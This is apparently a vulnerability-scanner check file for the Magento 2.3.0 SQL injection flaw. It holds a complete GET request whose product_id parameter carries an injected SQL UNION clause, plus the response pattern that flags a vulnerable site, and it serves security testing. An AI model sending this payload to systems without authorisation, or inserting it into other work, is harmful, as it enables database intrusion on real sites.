AUTHOR='@xer0dayz'
VULN_NAME='Magento 2.3.0 SQL Injection'
URI="/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=?&ids[0][product_id][to]=)))%20OR%20(SELECT%201%20UNION%20SELECT%202%20FROM%20DUAL%20WHERE%201=0)%20--%20-"
METHOD='GET'
MATCH="\[\]"
SEVERITY='P1 - Critical'
CURL_OPTS="--user-agent '' -s -L --insecure"
SECONDARY_COMMANDS=''
GREP_OPTIONS='-i'